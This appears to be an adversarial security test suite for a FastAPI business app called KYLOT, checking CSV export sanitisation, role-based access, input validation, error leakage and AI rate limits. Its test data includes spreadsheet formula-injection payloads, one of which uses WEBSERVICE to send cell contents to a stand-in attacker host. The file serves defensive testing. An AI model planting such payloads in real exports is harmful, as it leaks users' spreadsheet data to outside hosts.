"""Second independent adversarial pass for KYLOT.

This file deliberately covers areas that are not exercised by
``security_adversarial_checks.py``.  A failure means the secure behaviour in
the test name is not currently enforced.  It is intentionally outside normal
pytest discovery so that the audit does not masquerade as a green CI suite.
"""

from __future__ import annotations

import asyncio
import csv
import io
import math
import os
import unittest
from pathlib import Path


os.environ.update({
    "ENVIRONMENT": "production",
    "MONGO_URL": "mongodb://127.0.0.1:27017",
    "DB_NAME": "kylot_adversarial_round2",
    "JWT_SECRET": "round-two-adversarial-secret-at-least-32-characters",
    "FRONTEND_URL": "https://app.example.invalid",
    "CORS_ORIGINS": "https://app.example.invalid",
    "ALLOW_PUBLIC_REGISTRATION": "false",
    "ALLOW_DEMO_DATA": "false",
    "ALLOW_TOKEN_RESPONSE": "false",
    "RUN_STARTUP_MIGRATIONS": "false",
    "EXPOSE_API_DOCS": "false",
    "COOKIE_SECURE": "true",
    "COOKIE_SAMESITE": "lax",
})

from fastapi.testclient import TestClient
from mongomock_motor import AsyncMongoMockClient
from pydantic import ValidationError

from backend import server


ROOT = Path(__file__).resolve().parents[1]
SERVER_SOURCE = (ROOT / "backend/server.py").read_text(encoding="utf-8")


def run(coro):
    return asyncio.run(coro)


class RoundTwoHTTPChecks(unittest.TestCase):
    def setUp(self):
        self.mongo = AsyncMongoMockClient()
        self.db = self.mongo["kylot_adversarial_round2"]
        server.db = self.db
        server.client = self.mongo
        self.client = TestClient(server.app)
        self.admin = {
            "id": "admin-a", "email": "admin@example.invalid", "name": "Admin A",
            "password_hash": server.hash_password("correct-password-admin-round-two"),
            "role": "admin", "company_id": "company-a",
            "permissions": server.get_default_permissions("admin"),
        }
        self.tech = {
            "id": "tech-a", "email": "tech@example.invalid", "name": "Tech A",
            "password_hash": server.hash_password("correct-password-tech-round-two"),
            "role": "technicien", "company_id": "company-a",
            "permissions": server.get_default_permissions("technicien"),
        }
        run(self.db.users.insert_many([self.admin, self.tech]))
        self.admin_headers = {
            "Authorization": f"Bearer {server.create_access_token(self.admin['id'], self.admin['email'])}"
        }
        self.tech_headers = {
            "Authorization": f"Bearer {server.create_access_token(self.tech['id'], self.tech['email'])}"
        }

    def tearDown(self):
        self.client.close()
        self.mongo.close()

    def test_sales_csv_neutralizes_spreadsheet_formulas(self):
        payload = '=WEBSERVICE("https://attacker.invalid/?d="&A1)'
        run(self.db.clients.insert_one({
            "id": "client-formula", "company_id": "company-a", "name": payload,
            "phone": "+33000000000", "address": "1 rue", "postal_code": "75000", "city": "Paris",
        }))
        run(self.db.sales.insert_one({
            "id": "sale-formula", "company_id": "company-a", "client_id": "client-formula",
            "sale_date": "2026-10-16", "bdc": "B-1", "service": payload, "amount": 100,
            "commercial": "Admin A", "status": "en_cours", "notes": payload,
        }))
        response = self.client.get("/api/export/sales.csv", headers=self.admin_headers)
        self.assertEqual(response.status_code, 200, response.text)
        cells = [cell for row in csv.reader(io.StringIO(response.text), delimiter=";") for cell in row]
        self.assertFalse(any(cell.startswith(("=", "+", "-", "@")) for cell in cells[17:]))

    def test_projects_csv_neutralizes_spreadsheet_formulas(self):
        payload = "+HYPERLINK(\"https://attacker.invalid\",\"open\")"
        run(self.db.clients.insert_one({
            "id": "client-project-formula", "company_id": "company-a", "name": payload,
        }))
        run(self.db.projects.insert_one({
            "id": "project-formula", "company_id": "company-a", "client_id": "client-project-formula",
            "service": payload, "status": "en_cours", "notes": payload, "assigned_to": ["Tech A"],
        }))
        response = self.client.get("/api/export/projects.csv", headers=self.admin_headers)
        self.assertEqual(response.status_code, 200, response.text)
        cells = [cell for row in csv.reader(io.StringIO(response.text), delimiter=";") for cell in row]
        self.assertFalse(any(cell.startswith(("=", "+", "-", "@")) for cell in cells[10:]))

    def test_ai_sale_resolution_treats_client_name_as_literal_text(self):
        run(self.db.clients.insert_one({
            "id": "client-victim", "company_id": "company-a", "name": "Victim Client",
        }))
        run(self.db.sales.insert_one({
            "id": "sale-victim", "company_id": "company-a", "client_id": "client-victim",
            "status": "en_cours", "created_at": "2026-10-16T00:00:00Z",
        }))
        resolved = run(server._resolve_sale_for_status({"client_name": ".*"}, self.admin))
        self.assertIsNone(resolved)

    def test_technician_cannot_trigger_company_wide_14_day_job(self):
        run(self.db.sales.insert_one({
            "id": "sale-old", "company_id": "company-a", "client_id": "missing-client",
            "sale_date": "2020-01-01", "desired_intervention_date": "attente_14j",
            "status": "attente_prog",
        }))
        response = self.client.post("/api/sales/check-attente-14j", headers=self.tech_headers)
        self.assertEqual(response.status_code, 403, response.text)

    def test_technician_cannot_read_internal_commission_configuration(self):
        run(self.db.settings.insert_one({
            "id": "settings-a", "kind": "global", "company_id": "company-a",
            "commission_rates": [0.13, 0.25], "commission_ca_threshold": 250000,
            "commission_ca_rate_before": 0.13, "commission_ca_rate_after": 0.25,
        }))
        response = self.client.get("/api/settings", headers=self.tech_headers)
        self.assertEqual(response.status_code, 200, response.text)
        body = response.json()
        self.assertEqual(body.get("commission_rates"), [])
        self.assertEqual(body.get("commission_ca_threshold"), 0)

    def test_technician_cannot_read_team_emails_and_sales_targets(self):
        run(self.db.team_members.insert_one({
            "id": "tm-commercial", "company_id": "company-a", "type": "commercial",
            "name": "Sales Person", "email": "private@example.invalid", "objectif": 900000,
        }))
        response = self.client.get("/api/team", headers=self.tech_headers)
        self.assertIn(response.status_code, (200, 403), response.text)
        if response.status_code == 200:
            for member in response.json():
                self.assertNotIn("email", member)
                self.assertNotIn("objectif", member)

    def test_technician_cannot_read_commercial_bonus_rules(self):
        run(self.db.bonuses.insert_one({
            "id": "bonus-private", "company_id": "company-a", "name": "Prime ventes",
            "ca_threshold": 100000, "amount": 5000, "commerciaux": ["Sales Person"], "active": True,
        }))
        response = self.client.get("/api/bonuses", headers=self.tech_headers)
        self.assertIn(response.status_code, (200, 403), response.text)
        if response.status_code == 200:
            self.assertEqual(response.json(), [])

    def test_technician_cannot_read_named_personal_off_days(self):
        run(self.db.off_days.insert_one({
            "id": "off-private", "company_id": "company-a", "date": "2026-10-20",
            "scope": "person", "person_names": ["Sales Person"], "reason": "Medical",
        }))
        response = self.client.get("/api/off-days", headers=self.tech_headers)
        self.assertEqual(response.status_code, 200, response.text)
        for item in response.json():
            self.assertNotEqual(item.get("scope"), "person")
            self.assertNotIn("reason", item)

    def test_technician_cannot_read_company_wide_sales_status_counts(self):
        run(self.db.sales.insert_one({
            "id": "sale-counted", "company_id": "company-a", "status": "litige",
        }))
        response = self.client.get("/api/sale-statuses/usage", headers=self.tech_headers)
        self.assertEqual(response.status_code, 403, response.text)

    def test_technician_cannot_self_declare_unbounded_stock(self):
        run(self.db.stock.insert_one({
            "id": "stock-a", "company_id": "company-a", "product_key": "cable",
            "product_name": "Cable", "stock_disponible": 0, "holders": [],
        }))
        response = self.client.post(
            "/api/stock/stock-a/holder-adjust", headers=self.tech_headers,
            json={"delta": 1_000_000_000, "note": "self declared"},
        )
        self.assertIn(response.status_code, (400, 413, 422), response.text)


class RoundTwoValidationChecks(unittest.TestCase):
    def assert_rejected(self, factory):
        with self.assertRaises((ValidationError, ValueError)):
            factory()

    def test_sale_rejects_impossible_calendar_date(self):
        self.assert_rejected(lambda: server.SaleIn(service="Prestation", sale_date="2026-99-99"))

    def test_sale_rejects_non_positive_payment_installments(self):
        self.assert_rejected(lambda: server.SaleIn(
            service="Prestation", sale_date="2026-10-16", payment_installments=-50,
        ))

    def test_project_rejects_invalid_date_and_negative_duration(self):
        self.assert_rejected(lambda: server.ProjectUpdate(scheduled_date="not-a-date", duration_days=-99))

    def test_event_rejects_impossible_date_and_time_range(self):
        self.assert_rejected(lambda: server.EventIn(
            title="Impossible", date="2026-99-99", start_time="99:99", end_time="00:00",
        ))

    def test_financial_fields_reject_nan(self):
        self.assert_rejected(lambda: server.SettingsIn(objectif_ca=math.nan))
        self.assert_rejected(lambda: server.TeamMemberIn(
            name="Commercial", type="commercial", objectif=math.nan,
        ))

    def test_ai_prompts_have_a_small_explicit_bound(self):
        self.assert_rejected(lambda: server.AIChatIn(message="x" * 1_000_000))
        self.assert_rejected(lambda: server.KiksActIn(message="x" * 1_000_000))
        self.assert_rejected(lambda: server.AIActionIn(message="x" * 1_000_000))

    def test_stock_adjustment_has_a_reasonable_explicit_bound(self):
        self.assert_rejected(lambda: server.StockAdjustIn(delta=1_000_000_000))


class RoundTwoStaticChecks(unittest.TestCase):
    def test_provider_exceptions_are_not_returned_to_clients(self):
        dangerous = (
            "detail=f\"Analyse IA impossible : {e}\"",
            "detail=f\"Erreur IA: {e}\"",
            "detail=f\"Erreur IA: {str(e)}\"",
            "detail=str(e)",
        )
        found = [pattern for pattern in dangerous if pattern in SERVER_SOURCE]
        self.assertEqual(found, [], f"Raw internal exception text is exposed: {found}")

    def test_large_csv_exports_are_streamed_incrementally(self):
        export_block = SERVER_SOURCE.split("async def export_sales", 1)[1].split(
            "# ---------------- Email", 1
        )[0]
        self.assertNotIn("to_list(50000)", export_block)
        self.assertNotIn("buf.getvalue()", export_block)

    def test_ai_endpoints_have_cost_rate_limiting(self):
        ai_block = SERVER_SOURCE.split("# ---------------- AI Assistant", 1)[1].split(
            "# ---------------- AI Devis analyzer", 1
        )[0]
        limiter_markers = ("rate_limit", "RateLimiter", "quota", "token_budget")
        self.assertTrue(any(marker in ai_block for marker in limiter_markers))


if __name__ == "__main__":
    unittest.main(verbosity=2)
